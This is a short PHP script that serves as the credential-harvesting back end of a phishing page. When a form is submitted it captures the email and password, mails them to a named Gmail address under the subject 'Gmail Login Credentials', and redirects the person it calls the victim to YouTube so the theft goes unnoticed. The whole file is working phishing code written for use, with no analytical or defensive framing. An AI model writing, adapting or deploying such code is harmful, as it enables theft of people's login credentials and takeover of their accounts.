<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the email and password from the form
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Forward credentials to your Gmail
    $to = 'sasimanto01@gmail.com';
    $subject = 'Gmail Login Credentials';
    $message = "Email: $email\nPassword: $password";
    $headers = 'From: webmaster@example.com' . "\r\n" .
               'Reply-To: webmaster@example.com' . "\r\n" .
               'X-Mailer: PHP/' . phpversion();

    // Send email with captured credentials
    mail($to, $subject, $message, $headers);

    // Redirect victim to youtube.com
    header("Location: https://www.youtube.com/");
    exit();
}
?>
